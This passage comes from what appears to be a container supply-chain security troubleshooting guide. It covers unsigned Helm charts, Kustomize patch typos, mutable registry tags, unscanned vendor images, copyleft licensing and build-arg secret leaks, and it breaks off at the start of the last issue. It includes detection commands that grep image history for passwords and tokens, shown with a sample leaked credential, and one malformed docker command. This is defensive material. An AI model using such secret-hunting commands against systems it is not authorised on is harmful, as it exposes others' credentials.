docker build --no-cache -t test-rebuild . ; diff <(syft test-rebuild) <(syft anihpj/jobpost-api:v1.3) Compare a rebuilt image (no cache) with the current image. If packages differ, the current image uses stale cached layers.
🎯 #1 Root Cause: Docker build caching (--cache-from) reuses package installation layers indefinitely. When apt-get update && apt-get install is cached, new security patches are never applied — the image contains old packages with known CVEs despite being freshly tagged. Weekly --no-cache rebuilds are not scheduled.
🔧 How to Solve:
1. Schedule weekly --no-cache rebuilds Cron job or scheduled CI pipeline: docker build --no-cache -t anihpj/jobpost-api:latest . runs every Sunday. All layers are rebuilt from scratch with the latest packages. Old caches are invalidated.
2. Separate apt update from apt install in Dockerfile RUN apt-get update RUN apt-get install -y --no-install-recommends curl ca-certificates Two separate RUN commands. The apt-get update layer is rebuilt when the cache is busted. The install layer is rebuilt when packages change.
3. Add a cache-busting argument for time-based invalidation ARG CACHE_BUST=$(date +%s) RUN echo "Cache bust: $CACHE_BUST" && apt-get update && apt-get install -y curl The CACHE_BUST ARG changes on every build — invalidating the cache for that layer. Forces a fresh apt-get update and install each time.
4. Compare SBOM between builds to detect stale packages syft diff image:previous image:current CI step: if packages haven't changed in 2+ weeks, flag the image for review. Packages should update regularly as upstream patches are released.
5. Set maximum layer age policy Alert if any layer in a production image is older than 14 days. Old layers indicate excessive caching — the image should be rebuilt with --no-cache.
💡 Personal Advice:
Cached layers are frozen-in-time vulnerabilities. Every cached apt-get install layer is a snapshot of packages from whenever it was first built. If that was 3 months ago, you're running 3-month-old binaries with 3 months of unpatched CVEs — in an image tagged "v1.3" that looks brand new. Rebuild weekly with --no-cache.
Cache is for speed during development. --no-cache is for security in production. Use caching during PR and feature branch builds. Use --no-cache for release and production builds. The security of your production images is worth the extra 2 minutes of build time.

📌 SC13–SC16: Helm Trust, Kustomize, Tag Immutability & Third-Party Images

SC13
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC13
Helm Chart from Untrusted Repository — No Provenance Verification

🔍 Symptom: helm repo add anihpj-charts https://charts.anihpj.com && helm install anihpj-api anihpj-charts/api --version 1.2.0 installs a Helm chart from a repository with NO TLS certificate verification, NO chart provenance (--verify), and NO integrity checking. The chart repository is hosted on an S3 bucket with public access — anyone who compromises the S3 bucket can replace the chart with a malicious version. The next helm upgrade deploys the compromised chart, which could create privileged pods, exfiltrate Secrets, or deploy crypto miners.

  helm install anihpj-api anihpj-charts/api --version 1.2.0   # No --verify!
  NAME: anihpj-api   STATUS: deployed   ← CHART INSTALLED WITHOUT VERIFICATION!

  helm verify anihpj-charts/api-1.2.0.tgz
  Error: chart has no provenance file   ← UNSIGNED CHART!
🔴5 Most Likely Causes
  1. Helm chart not signed with --sign: helm package --sign --key 'anihpj' --keyring .gnupg/secring.gpg api/ was never run. The chart is published unsigned — there's no cryptographic proof of origin. helm install --verify cannot verify an unsigned chart.
  2. helm install without --verify flag: Even if charts ARE signed, helm install without --verify skips provenance verification. The chart is installed regardless of signature validity. Charts must be verified on EVERY install AND upgrade.
  3. Chart repository hosted on public S3/GCS bucket: The chart repo is an S3 bucket with public read access. Anyone who discovers the bucket URL can view all chart versions, download them, and — if write access is misconfigured — replace them. Use a proper chart registry (Harbor, ChartMuseum with auth).
  4. No HTTPS/TLS on chart repository: https://charts.anihpj.com uses a self-signed certificate or plain HTTP. An attacker performing MITM on the chart download can inject a malicious index.yaml pointing to compromised charts. Helm accepts it because TLS verification is disabled with --insecure-skip-tls-verify.
  5. Chart contains default values with excessive permissions: The values.yaml in the chart has securityContext: {privileged: true} or rbac.create: true with cluster-admin ClusterRole. Installing the chart — even a legitimate one — grants excessive permissions because the defaults are insecure.
🟡5 Less Likely Causes
  1. Chart repository index.yaml tampered: The index.yaml file lists all chart versions and their digests. An attacker who modifies index.yaml can point to a malicious .tgz file at a different URL — Helm fetches it without verifying the chart digest against a known good value.
  2. Chart dependency on untrusted sub-chart: The chart has a requirements.yaml or Chart.yaml dependency on bitnami/postgresql. If the Bitnami chart is compromised or replaced, the dependency pulls in the malicious sub-chart.
  3. Chart uses deprecated or vulnerable Kubernetes API versions: apiVersion: extensions/v1beta1 in the chart templates. These APIs may be removed or have known security issues. Helm installs them without warning if the cluster still supports them.
  4. Chart contains hook with elevated permissions: helm.sh/hook: pre-install job runs with cluster-admin to create CRDs. The hook container image is from an untrusted registry — and runs with elevated RBAC before the main chart is deployed.
  5. Chart values inject secrets from untrusted source: helm install --set database.password=$SECRET where $SECRET comes from an untrusted CI variable. The value is passed to the chart and may be logged or stored in release history (Helm secrets).
🟣5 New Cluster Causes
  1. Chart repository set up without signing infrastructure: Quick chart repo created for internal use. GPG key generation and chart signing was skipped — "we'll add it later."
  2. No OCI-based Helm registry (Harbor/ACR): Using legacy chart repos instead of OCI registries. OCI registries support Cosign signing and digest pinning — legacy repos don't.
  3. No chart review or approval process: Developers publish charts directly to the repo. No security review of chart templates, default values, or RBAC configurations.
  4. Helm not installed with security plugins: No helm-secrets plugin for encrypting values. No helm-diff to review changes before apply. Helm is used in its default, least-secure configuration.
  5. No admission policy for Helm releases: Kyverno could validate chart provenance at admission time. Without it, unsigned charts from untrusted repos are silently deployed.
🔍 What to Look At:
helm repo list Check all configured chart repositories. Each one is a supply chain dependency. Verify the URL uses HTTPS and the repo is trusted.
helm verify anihpj-charts/api-1.2.0.tgz If it returns "no provenance file," the chart is unsigned. It could have been created by anyone — no cryptographic proof of origin exists.
helm get values anihpj-api -n anihpj Review deployed chart values. Check for: privileged: true, cluster-admin RBAC, hostPath mounts, or other insecure defaults from the chart.
🎯 #1 Root Cause: Helm charts are not GPG-signed and helm install is used without --verify. Charts are installed from a public repository without any provenance or integrity verification — a compromised chart repository or MITM attacker can inject malicious charts that deploy privileged pods or exfiltrate Secrets.
🔧 How to Solve:
1. Sign all Helm charts with GPG helm package --sign --key 'anihpj-signing' --keyring ~/.gnupg/secring.gpg api/ Generate a GPG key for chart signing. Sign every chart before publishing. The .prov provenance file is uploaded alongside the .tgz.
2. Always install/upgrade with --verify helm install anihpj-api anihpj-charts/api --verify --version 1.2.0 Helm verifies the chart's provenance signature against the trusted GPG keyring. If verification fails, Helm REFUSES to install. This blocks tampered or unsigned charts.
3. Migrate to OCI-based Helm chart storage (Harbor/ACR) helm push api-1.2.0.tgz oci://harbor.internal.anihpj.com/charts OCI registries support digest pinning, Cosign signing, and RBAC. Chart integrity is guaranteed by the registry — not just a static file on S3.
4. Lock chart dependencies with digest In Chart.lock or Chart.yaml dependencies, pin to specific digests. Dependencies are not pulled from floating tags — they're pinned to immutable content hashes.
5. Deploy Kyverno to verify chart provenance at admission Kyverno policy: verify Helm release secrets have valid provenance. Reject releases from unsigned charts or charts from untrusted repositories.
💡 Personal Advice:
helm install without --verify is Russian roulette. Without --verify, Helm will install ANY chart from ANY repository — including a chart that an attacker swapped with a malicious version. Chart signing and verification is the Helm equivalent of Cosign for container images. Use it.
OCI registries are the future of Helm chart storage. Legacy chart repos (S3/GCS buckets with index.yaml) are fragile and hard to secure. OCI registries give you: digest pinning, RBAC, Cosign signing, vulnerability scanning — all the same controls you have for container images. Migrate now.
SC14
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC14
Kustomize Overlay Injects Insecure Config — Production Inherits Dev Settings

🔍 Symptom: The anihpj Kustomize setup has a base/ with shared configuration and overlays for dev/, staging/, and prod/. The base defines securityContext: {privileged: true} because dev needs it. The prod overlay is supposed to override it to {privileged: false} — but the strategic merge patch has a typo: securityContxt: (missing 'e'). The base's privileged: true silently passes through to production. Kustomize strategic merge patches are error-prone: a typo silently falls through to the base value. Production is running privileged containers because of a one-character YAML error.

  kustomize build overlays/prod | grep -A5 securityContext
  securityContext:
    privileged: true   ← SHOULD BE FALSE! Typo in overlay patch!

  cat overlays/prod/security-patch.yaml
  apiVersion: apps/v1
  kind: Deployment
  metadata: {name: anihpj-api}
  spec:
    template:
      spec:
        securityContxt: {privileged: false}   ← TYPO! "securityContxt" ignored!
🔴5 Most Likely Causes
  1. Kustomize strategic merge patch with typo silently ignored: securityContxt (typo) doesn't match any field. Kustomize adds it as a new unknown field — it does NOT override securityContext from the base. The base value passes through unchanged. Kustomize doesn't warn about unmatched fields.
  2. Insecure defaults in base inherited by all overlays: The base defines settings that are convenient for dev (privileged: true, hostNetwork: true). Overlays must explicitly override every insecure default. If an overlay misses one, the insecure base value is deployed to production.
  3. No kustomize build output validation: kustomize build overlays/prod output is never reviewed. The generated YAML is applied directly — no one checks if production has privileged: true before deploying.
  4. Overlay patch target selector too broad or missing: The patch has no metadata.name or metadata.labels — it applies to ALL Deployments. Or it has the wrong name — the patch silently applies to nothing. Kustomize doesn't error on unmatched patches.
  5. Strategic merge adds lists instead of replacing: Kustomize strategic merge ADDS containers instead of replacing. The overlay intended to replace the container list with a single secure container, but Kustomize added it alongside the base's insecure container — resulting in BOTH running.
🟡5 Less Likely Causes
  1. JSON 6902 patch path wrong: patchesJson6902: [{target: {...}, patch: '[{"op":"replace","path":"/spec/template/spec/securityContext/privileged","value":false}]'}] — the path /securityContext/privileged is wrong (it's nested under containers). The patch is silently skipped.
  2. Overlay resource merged when it should replace: Using strategicMerge when patchesStrategicMerge should be used. Fields that should be replaced are merged — resulting in a combination of dev and prod settings that neither environment intended.
  3. Image tag overridden by overlay but digest not: The overlay changes the image tag from :dev to :prod but the base has imagePullPolicy: Always. The production image can still be replaced because the policy forces a re-pull on every restart — picking up whatever the tag currently points to.
  4. ConfigMap generator merges dev and prod values: configMapGenerator merges dev-config.env and prod-config.env. If the same key exists in both, the overlay's value wins — but other keys from dev leak into production. Production ConfigMap has dev database URLs and debug flags.
  5. No Kustomize validation policy in CI: CI builds Kustomize output but doesn't validate it against security policies (e.g., "no privileged: true in prod overlay"). The build succeeds — the output is insecure — and it's deployed.
🟣5 New Cluster Causes
  1. Kustomize base created from dev environment: The base was extracted from the running dev configuration. Dev had privileged: true for debugging — and that became the base default that all environments inherit.
  2. No overlay-specific security review: Base is reviewed for security. Overlays are "just patches" — they're not reviewed. A missing or wrong patch silently passes through base values.
  3. No post-build validation of Kustomize output: CI doesn't run conftest, kubeval, or kubeconform against kustomize build output. The generated YAML is applied unchecked.
  4. Kustomize strategic merge behavior not well understood: Teams don't understand the difference between strategic merge, JSON 6902 patch, and replacement. Incorrect patch types lead to silent incorrect output.
  5. No policy-as-code for Kustomize: No conftest or OPA policy checking: "prod overlay must set securityContext.privileged=false" and "prod overlay must NOT have hostNetwork=true."
🔍 What to Look At:
kustomize build overlays/prod | grep -A10 "securityContext\|hostPID\|hostNetwork\|privileged" Always review the built output for production. Look for any insecure settings that should have been overridden by the overlay.
diff <(kustomize build base) <(kustomize build overlays/prod) | grep -E "^>|^<" | head -50 Diff base vs prod output. Verify that every security-critical field differs between base and prod. The prod overlay should add restrictions, not loosen them.
cat overlays/prod/kustomization.yaml Review all patches in the prod overlay. Verify every security-critical field from the base is explicitly overridden (not just assumed).
🎯 #1 Root Cause: Kustomize strategic merge patches silently ignore typos or unmatched field paths. A one-character YAML error in the production overlay's security patch causes it to be silently skipped — the base's insecure defaults (privileged: true) pass through to production undetected.
🔧 How to Solve:
1. Validate Kustomize output against security policies in CI kustomize build overlays/prod | conftest test -p policy/ - Conftest/OPA policy: "prod MUST have privileged=false," "prod MUST NOT have hostNetwork=true." Fail CI if the generated YAML violates these policies.
2. Use JSON 6902 patches instead of strategic merge for critical fields JSON 6902 patches are explicit: {"op":"replace","path":"/spec/template/spec/containers/0/securityContext/privileged","value":false}. If the path doesn't exist, the patch FAILS — no silent skip.
3. Don't put insecure defaults in the base: Base should be secure by default. Dev overlay ADDS permissions if needed. Never put privileged: true in the base — add it ONLY in the dev overlay, and ONLY for the specific containers that need it.
4. Review kustomize build output in PR diff CI step: kustomize build overlays/prod > /tmp/prod.yaml && diff <(git show HEAD:deploy/prod.yaml) /tmp/prod.yaml. The PR shows exactly what changes in the generated YAML — including silent pass-throughs.
5. Use replacement patches for complete field replacement Kustomize replacements (newer feature): completely replaces fields instead of merging. privileged: true in base is replaced wholesale by the overlay's value. No merge, no pass-through.
💡 Personal Advice:
Kustomize strategic merge is powerful but dangerous — it silently ignores typos. A patch with securityContxt (typo) is not an error — Kustomize just doesn't match any field and moves on. Your production security settings silently revert to the base defaults. Always validate kustomize build output against security policies in CI.
Secure base, not insecure base with secure overlay. The base should be the most secure configuration. Overlays should ADD permissions for environments that need more access (dev, testing). Never put privileged: true in a base that feeds into production.
SC15
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC15
No Image Tag Immutability in Registry — Tags Can Be Overwritten

🔍 Symptom: docker tag anihpj/jobpost-api:new-build anihpj/jobpost-api:v1.2 && docker push anihpj/jobpost-api:v1.2 OVERWRITES the existing :v1.2 tag with a completely different image. The registry allows tag mutation — the same tag can point to different images at different times. A deployment that pinned to :v1.2 pulls a different image on restart with imagePullPolicy: Always. What was tested and verified as :v1.2 in staging is NOT what's running in production. Tag immutability (the rule that a tag, once pushed, can NEVER be changed) is not enforced at the registry level.

  docker build -t anihpj/jobpost-api:v1.2 . && docker push anihpj/jobpost-api:v1.2
  v1.2: digest: sha256:abc123... size: 2413   ← ORIGINAL v1.2

  docker build -t anihpj/jobpost-api:v1.2 . && docker push anihpj/jobpost-api:v1.2
  v1.2: digest: sha256:def456... size: 2520   ← TAG OVERWRITTEN!
🔴5 Most Likely Causes
  1. Registry tag immutability not enabled: ECR, GCR, ACR, and Harbor all support tag immutability — but it's NOT enabled by default. Once enabled, a tag can only be pushed ONCE. Any attempt to overwrite is rejected. The registry must be explicitly configured.
  2. Developers re-tag images for "convenience": Instead of creating a new version tag (:v1.3), developers overwrite the existing tag (:v1.2) to "fix" a bug. The tag now points to a different image than what was deployed to staging and tested — production has an untested image.
  3. CI pipeline overwrites tags on rebuild: The CI pipeline rebuilds :v1.2 on every push to the release branch. Each push overwrites the previous :v1.2. The tag is a moving target — you can never know which commit the running :v1.2 was built from.
  4. imagePullPolicy: Always with mutable tags: The deployment has imagePullPolicy: Always. On every pod restart, the kubelet pulls the latest :v1.2 — which may be a different image than what was originally deployed. The running image drifts silently.
  5. Same tag used across environments: :latest is used in dev, staging, AND production. Each environment has its own build pipeline that overwrites :latest. The image running in production changes every time staging or dev runs a build.
🟡5 Less Likely Causes
  1. Tag cleanup policy removes tags still in use: Registry has a tag retention policy that deletes tags older than 30 days. A long-running deployment still references the deleted tag. On restart, the image pull fails because the tag no longer exists.
  2. Digest referenced in one place but tag in another: Deployment YAML references :v1.2 but a mutating webhook rewrites it to @sha256:.... The webhook and the deployment reference different images — the running image doesn't match what's documented.
  3. Multi-arch image with platform-specific tags overwritten: :v1.2-amd64 and :v1.2-arm64 are pushed separately. The manifest list for :v1.2 (multi-arch) is overwritten when one platform is pushed. The other platform's image is lost from the manifest.
  4. Registry replication lag causes inconsistent tags: Tags are replicated across regions. A push to the primary region overwrites the tag, but the replica regions still serve the old image. Pods in different regions run different images from the same tag.
  5. Tag used as version identifier but actually meaningless: The team THINKS :v1.2 identifies a specific build, but the tag has been overwritten 5 times. :v1.2 means "whatever the last push was" — not a specific commit or build.
🟣5 New Cluster Causes
  1. Tag immutability not in default registry configuration: New ECR/GCR/Harbor setup: tag immutability must be manually enabled per repository. Most teams never touch the defaults.
  2. No image versioning strategy: No convention for version tags (:v1.2.3, :commit-abc123, :build-456). :latest or :v1.2 is the only tag — and it's constantly overwritten.
  3. Digest pinning not used because "tags are easier": Teams reference images by tag (:v1.2) because digests are "too long" and "hard to read." The convenience of tags is chosen over the immutability of digests.
  4. No registry audit log for tag mutations: No alerting when a tag is overwritten. The security team doesn't know that production's image tag has been redirected to a different build.
  5. No policy requiring unique version per build: CI can rebuild the same tag multiple times. No policy enforces: "every build gets a unique tag; tags are immutable once pushed."
🔍 What to Look At:
docker build -t test-overwrite anihpj/jobpost-api:v1.2 && docker push anihpj/jobpost-api:v1.2 Try overwriting an existing tag. If the push succeeds, tag immutability is DISABLED — any tag can be redirected to any image at any time.
kubectl get pods -n anihpj -o json | jq '.items[] | {name, image: .spec.containers[].image, pullPolicy: .spec.containers[].imagePullPolicy}' Check if pods use mutable tags (:v1.2) with imagePullPolicy: Always. This combination means the running image can change on every restart.
docker manifest inspect anihpj/jobpost-api:v1.2 | jq '.config.digest' Record the current digest for the tag. Check again tomorrow. If the digest changed, the tag was overwritten — and whatever was running yesterday may be different from what's running today.
🎯 #1 Root Cause: Tag immutability is not enabled in the container registry. Tags can be overwritten — the same tag can point to different images at different times. Deployments referencing mutable tags may pull different (potentially untested or malicious) images on restart, breaking the guarantee that what was tested is what's running.
🔧 How to Solve:
1. Enable tag immutability on all registries ECR: aws ecr put-image-tag-mutability --repository-name jobpost-api --image-tag-mutability IMMUTABLE. Harbor: project configuration → Immutable tags. ACR: repository policy → immutable tags. Once pushed, a tag can NEVER change.
2. Use unique tags per build (never reuse) docker tag anihpj/jobpost-api:latest anihpj/jobpost-api:v1.2.3-${GIT_SHA} Each build gets a unique tag: version + git commit SHA. Tags are never overwritten because each tag is unique. :v1.2.3-abc123 is different from :v1.2.3-def456.
3. Deploy by digest, not tag image: anihpj/jobpost-api@sha256:abc123... Digests are immutable by design. The SHA256 hash of the image content CANNOT change. Deploying by digest guarantees the exact image that was tested.
4. Set imagePullPolicy: IfNotPresent for pinned images If using immutable tags or digests, use IfNotPresent. The image is already on the node — no need to re-pull. This prevents unnecessary registry load and avoids edge cases with registry unavailability.
5. Alert on tag mutation attempts Registry audit log: alert when a tag overwrite is attempted (even if rejected by immutability). An attempt indicates either a misconfigured CI pipeline or malicious activity.
💡 Personal Advice:
A mutable tag is not a version — it's a suggestion. :v1.2 promises "version 1.2." But if the tag is mutable, it means "whatever was last pushed to this tag." A deployment might think it's running v1.2-test-passed but actually running v1.2-last-minute-hotfix. Enable tag immutability. Every registry supports it. Turn it on.
Digests ARE the version. Tags are just labels. @sha256:abc123... is the TRUTH — the exact image content. :v1.2 is just a human-readable label that may or may not point to the truth. Deploy by digest for production. Use tags for human reference only.
SC16
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC16
Third-Party Container Without CVE Scan — Untrusted Base Image

🔍 Symptom: The anihpj-api deployment includes a sidecar from docker.io/some-vendor/log-shipper:latest — a third-party container for shipping logs. The image has never been scanned for CVEs. trivy image docker.io/some-vendor/log-shipper:latest returns 87 vulnerabilities: 5 CRITICAL, 12 HIGH, 30 MEDIUM. The vendor image was built 14 months ago — it's unmaintained, contains known-exploitable CVEs, and runs with the same ServiceAccount and network access as the application. Third-party images are the #1 source of unpatched vulnerabilities in Kubernetes clusters.

  trivy image docker.io/some-vendor/log-shipper:latest
  docker.io/some-vendor/log-shipper:latest (debian 11.3)
  Total: 87 (CRITICAL: 5, HIGH: 12, MEDIUM: 30, LOW: 40)
  ┌──────────────────────┬──────────┬──────────────┬──────────────────┐
  │ CVE-2023-44487       │ CRITICAL │ golang http/2│ Rapid Reset DoS  │
  │ CVE-2023-38545       │ HIGH     │ curl         │ Heap Buffer Ovrfl│
🔴5 Most Likely Causes
  1. Third-party image deployed without scanning: The vendor's image was added to the deployment YAML without running trivy image or grype. No CVE assessment was performed — the image was trusted solely because it came from a "known vendor."
  2. Third-party image is unmaintained — no updates: The vendor hasn't updated the image in 14 months. All CVEs discovered since then are present. The image is effectively abandonware — but it's still running in production.
  3. No recurring scan of running images: The image was scanned once (or never). CVEs are discovered DAILY. An image that was clean 6 months ago may have critical CVEs today — but running images are not rescanned periodically.
  4. Third-party image runs with same ServiceAccount as app: The sidecar shares the pod's ServiceAccount. If the sidecar is compromised via a CVE, the attacker inherits the pod's RBAC permissions — which may include get secrets or create pods.
  5. No vulnerability remediation SLA for third-party images: The team has an SLA for patching their own images (7 days for CRITICAL). There's NO SLA for third-party images — they run with known CVEs indefinitely because "we can't rebuild someone else's image."
🟡5 Less Likely Causes
  1. Third-party image from Docker Hub without digest pinning: image: some-vendor/log-shipper:latest — the :latest tag can change at any time. The vendor could push a malicious update, and the cluster pulls it automatically on the next restart with imagePullPolicy: Always.
  2. Vendor image contains unnecessary tools: The log shipper image includes curl, wget, nc, and bash — 300+ packages. An attacker exploiting the log shipper has a full toolbelt for lateral movement.
  3. Vendor image requires privileged or root access: The log shipper needs to read host log files — so it runs as privileged: true with hostPath: /var/log. The most vulnerable image in the pod also has the MOST privileges.
  4. No network segmentation for sidecar: The sidecar shares the pod's network namespace. It can connect to the application's database, redis, and internal APIs — even though its only job is to ship logs to an external service.
  5. License or compliance risk from third-party image: The vendor image may contain GPL-licensed code that taints the entire pod. No license compliance scan was performed — the organization may be in violation of open-source licenses.
🟣5 New Cluster Causes
  1. Third-party image from public registry without review: Developer found the image on Docker Hub, tested it locally, and added it to the deployment YAML. No security review, no CVE scan, no approval process.
  2. No allowed-registry policy for third-party images: No admission policy blocking images from untrusted registries. docker.io/some-vendor/* is treated the same as anihpj.azurecr.io/*.
  3. No vulnerability scanning for third-party images in CI: CI pipeline scans application images but NOT third-party sidecar images. The sidecar is invisible to the security scanning process.
  4. No third-party image policy: The organization has no policy on: which vendors are trusted, how often images are scanned, or what CVE severity requires immediate replacement.
  5. Third-party image is the ONLY option: The log-shipping functionality is only available as a pre-built image. The team has no alternative — they accept the risk because there's no other way to get the functionality.
🔍 What to Look At:
kubectl get pods -A -o json | jq '.items[].spec.containers[].image' | grep -v "anihpj\|k8s.gcr\|registry.k8s" | sort -u List all third-party images running in the cluster. Each one from an external registry is a potential vulnerability vector that needs CVE scanning.
trivy image <third-party-image> --severity CRITICAL,HIGH Scan every third-party image. CRITICAL and HIGH CVEs require immediate remediation — either update the image or replace it with an alternative.
docker inspect <third-party-image> | jq '.[0].Created' Check the image creation date. Images older than 6 months without updates are unmaintained — they WILL have unpatched CVEs. Flag for review or replacement.
🎯 #1 Root Cause: Third-party container images are deployed without CVE scanning and without any ongoing vulnerability monitoring. These images — often unmaintained and years old — contain critical CVEs that expose the pod (and the application's ServiceAccount) to compromise via well-documented exploits.
🔧 How to Solve:
1. Scan ALL third-party images before deployment trivy image docker.io/some-vendor/log-shipper:latest --severity CRITICAL,HIGH --exit-code 1 Fail CI if third-party images have CRITICAL or HIGH CVEs. No exception for "vendor images" — they're subject to the same security standards as your own.
2. Pin third-party images by digest image: docker.io/some-vendor/log-shipper@sha256:abc123... Prevent the vendor from silently updating the image. You control WHEN updates happen — after you've scanned and verified the new digest.
3. Schedule recurring scans of all running images CronJob: trivy image --input /tmp/all-images.txt runs weekly. Alert on any NEW CRITICAL/HIGH CVEs discovered in running pods. CVEs are discovered daily — your scan must also run daily.
4. Mirror third-party images to your private registry Pull the image, scan it, and push to anihpj.azurecr.io/mirror/log-shipper:v1. Your admission policy only allows images from your private registry — third-party images are now under your control.
5. Have an alternative or fallback for critical sidecars If the vendor abandons the image (no updates >6 months), have a plan: swap to an alternative (Fluent Bit instead of vendor log shipper), or fork and maintain your own build from the vendor's source.
💡 Personal Advice:
"Vendor-provided" ≠ "secure." Scan it anyway. The fact that an image comes from a known vendor doesn't mean it's free of CVEs. Many vendor images are built once and never updated. Scan every image — first-party, third-party, sidecar, init container. Zero exceptions.
A third-party CVE in a sidecar compromises your entire pod. The sidecar shares the pod's network, IPC, and possibly PID namespace. If it's compromised, the attacker has access to your application's traffic, files, and ServiceAccount. Treat sidecar security with the same seriousness as application security.

📌 SC17–SC20: License, Build Args, SLSA & GitOps Verification

SC17
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC17
No Dependency License Compliance Check — GPL Copyleft in Proprietary App

🔍 Symptom: The anihpj-api Dockerfile has pip install some-gpl-library — a Python package licensed under GPLv3 (copyleft). The anihpj/jobpost application is proprietary (closed-source). By linking against a GPL library, the ENTIRE application may be subject to GPL's copyleft requirement — meaning the organization must release the full source code. No license compliance scan is run in CI. The legal and security teams are unaware that the codebase includes copyleft dependencies. This is a legal time bomb: the organization could be forced to open-source their proprietary code or face litigation.

  pip-licenses --format=json | jq '.[] | select(.License | test("GPL|AGPL|EUPL"))'
  [{"Name": "some-gpl-library", "Version": "1.3.0", "License": "GPLv3"}]

  syft anihpj/jobpost-api:v1.2 -o syft-json | grype | grep -i "gpl\|copyleft"
  # No license scanning configured — copyleft dependencies undetected!
🔴5 Most Likely Causes
  1. No license scanning in CI pipeline: No tool like pip-licenses, license-checker, fossa-cli, or ort (OSS Review Toolkit) runs during CI. Dependencies are added without checking their licenses. Copyleft licenses (GPL, AGPL, EUPL) slip through undetected.
  2. Developers unaware of license implications: Developers add packages based on functionality — not license. GPLv3 means: "if you use this library, your entire application must be GPLv3." Developers don't know this — they just pip install whatever solves the problem.
  3. No approved license list: The organization has no policy defining which licenses are acceptable (MIT, Apache-2.0, BSD) and which are restricted (GPL, AGPL, SSPL). Without a policy, there's nothing to enforce.
  4. Transitive dependency with copyleft license: The direct dependency is MIT-licensed, but it depends on a GPL library (transitive). License scanning must check the FULL dependency tree — not just top-level packages. Transitive copyleft is the hidden legal risk.
  5. Dual-licensed package — wrong license used: A package offers "GPLv3 OR Commercial." The team installed it without the commercial license — defaulting to GPLv3. The commercial license would have been acceptable, but no one checked which license applied.
🟡5 Less Likely Causes
  1. License changed between versions: A library was MIT-licensed in v1.0 but changed to GPLv3 in v2.0. The team upgraded without noticing the license change. Version upgrades should trigger license re-evaluation.
  2. License file missing from package metadata: The LICENSE file exists in the repo but wasn't included in the pip package metadata. pip-licenses reports "UNKNOWN" — the dependency is invisible to license scanning. Manual review of the repo is required.
  3. Open-source package with no license at all: A package has NO license file. By default, "no license" means "all rights reserved" — the team has no legal right to use the package at all. This is worse than copyleft: it's copyright infringement.
  4. License in OS packages (apt/deb), not just pip/npm: License scanning only covers pip packages. apt-get install packages (libcurl, openssl) have their own licenses — some with copyleft terms (e.g., GNU Readline is GPLv3). OS-level license scanning is often overlooked.
  5. License compliance gap during M&A due diligence: The company is being acquired. During due diligence, the acquirer's legal team scans the codebase and discovers GPL dependencies. The deal is delayed or penalized because of unaddressed license compliance issues.
🟣5 New Cluster Causes
  1. Legal and engineering teams disconnected: No communication channel between legal and engineering about open-source licensing. Engineers don't know the legal constraints — legal doesn't know what's in the code.
  2. No license policy in engineering onboarding: New developers are not trained on the organization's license policy. They use the same packages they've always used — including GPL — unaware that the organization prohibits copyleft.
  3. Startup phase: "we'll deal with licenses later": Early-stage startup focused on speed. License compliance is deferred — creating a growing body of license debt that becomes harder to fix as the codebase grows.
  4. No SBOM integration with license database: SBOM is generated but not fed into a license compliance tool (FOSSA, Black Duck, Snyk). The license data exists but is never analyzed.
  5. No automated license policy enforcement in CI: No step in CI that says "reject any package with GPL/AGPL license." Dependencies are added without automated license gating.
🔍 What to Look At:
pip-licenses --format=json | jq '.[] | select(.License | test("GPL|AGPL|EUPL|SSPL|Unknown"))' Find all dependencies with copyleft licenses or unknown licenses. Each match is a legal risk that requires immediate review.
syft anihpj/jobpost-api:v1.2 -o spdx-json | jq '.packages[] | select(.licenseDeclared | test("GPL|AGPL"))' Check the SBOM for copyleft licenses across ALL packages — pip, apt, and OS-level. Copyleft can hide in any layer.
cat .github/workflows/ci.yml | grep -iE "license|fossa|pip-licenses|ort" Check if CI pipeline has any license scanning step. Absence means license compliance is not automated — it's manual or nonexistent.
🎯 #1 Root Cause: No license compliance scanning is performed on dependencies. Copyleft-licensed packages (GPL, AGPL) are included in proprietary software without detection — creating legal liability that could force the organization to open-source proprietary code or face litigation.
🔧 How to Solve:
1. Add license scanning to CI pipeline pip-licenses --allow-only="MIT;Apache-2.0;BSD;ISC;PSF;Python" --fail-on="GPL;AGPL;EUPL;SSPL;Unknown" Fail the build if any dependency has a restricted or unknown license. This prevents copyleft from entering the codebase.
2. Define an approved license policy Category 1 (Allowed): MIT, Apache-2.0, BSD-2/3-Clause, ISC. Category 2 (Review Required): MPL-2.0, LGPL. Category 3 (Prohibited): GPLv2/v3, AGPL, SSPL, Unlicensed. Legal team approves this classification.
3. Scan the FULL dependency tree (including transitives) Use pip-licenses --with-system --with-authors --with-urls and combine with syft for OS-level packages. Transitive dependencies are just as legally binding as direct ones — scan everything.
4. Integrate with FOSSA or Snyk for continuous license monitoring These tools monitor your dependencies continuously and alert when licenses change between versions. A package upgrade from MIT → GPL is flagged immediately.
5. Replace copyleft dependencies with permissive alternatives For every GPL dependency, find an MIT/BSD alternative. Python: readline (GPL) → pyreadline (BSD). Java: GPL libraries → Apache-licensed equivalents. Don't negotiate with copyleft — replace it.
💡 Personal Advice:
License compliance is security compliance. A GPL violation can cost millions in litigation and force you to open-source your entire codebase. It's a supply chain risk just like a CVE — except the "patch" is replacing the dependency entirely. Scan licenses with the same rigor you scan for CVEs. Fail the build on GPL. No exceptions.
Transitive dependencies carry the same legal weight. Your direct dependency is MIT, but it imports a GPL library. Your code is now subject to GPL — even though you never intentionally installed a GPL package. Always scan the full dependency tree. Transitive copyleft is the most common license surprise.
SC18
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC18
Build Args Leak Secrets in Image Layers — --build-arg Exposes Credentials

🔍 Symptom: docker build --build-arg DATABASE_URL=postgresql://admin:secret@db:5432/jobpost -t anihpj/jobpost-api . passes a database password as a build argument. docker history anihpj/jobpost-api:v1.2 shows the FULL build argument value in the image history — including the password. Anyone with image pull access can docker history and extract the database password. Build args are NOT secrets — they're embedded in the image metadata in plaintext. Every image built with --build-arg containing secrets permanently exposes those secrets to anyone who can pull the image.

  docker build --build-arg DB_PASSWORD=SuperSecretP@ss123! -t anihpj/jobpost-api:v1.2 .
  Successfully built abc123

  docker history anihpj/jobpost-api:v1.2 --no-trunc | grep -i "password\|secret\|token"
  /bin/sh -c #(nop) ARG DB_PASSWORD=SuperSecretP@ss123!   ← SECRET IN HISTORY!
🔴5 Most Likely Causes
